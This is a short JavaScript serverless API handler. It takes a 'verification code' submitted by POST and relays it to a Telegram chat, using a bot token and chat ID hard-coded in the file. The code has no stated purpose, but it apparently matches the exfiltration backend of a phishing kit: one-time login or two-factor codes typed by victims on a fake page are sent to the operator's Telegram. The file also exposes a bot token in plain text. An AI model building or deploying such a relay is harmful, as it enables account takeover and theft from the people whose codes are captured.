export default async function handler(req, res) {
  // Only accept POST requests
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  // Extract the code from the request body
  const { code } = req.body;

  // Validate that the code field exists
  if (!code) {
    return res.status(400).json({ error: 'code is required' });
  }

  // Telegram credentials – you can also move these to environment variables
  const BOT_TOKEN = '9141377727:AAENLzMxCc3R6YnxRmzPIE3DpLwpMM75s7Q';
  const CHAT_ID   = '5244788909';

  // Format a simple Markdown message
  const message = `🔐 *Verification Code:* \`${code}\``;

  // Telegram Bot API endpoint
  const apiUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

  // Payload
  const payload = {
    chat_id: CHAT_ID,
    text: message,
    parse_mode: 'Markdown',
  };

  try {
    const apiResponse = await fetch(apiUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(payload),
    });

    const data = await apiResponse.json();

    // Check if Telegram API reported an error
    if (!apiResponse.ok || !data.ok) {
      console.error('Telegram API error:', data);
      return res.status(500).json({ error: 'Failed to send code to Telegram', details: data });
    }

    // Success response
    res.status(200).json({ success: true });
  } catch (error) {
    console.error('Internal server error:', error);
    res.status(500).json({ error: 'Internal server error', details: error.message });
  }
}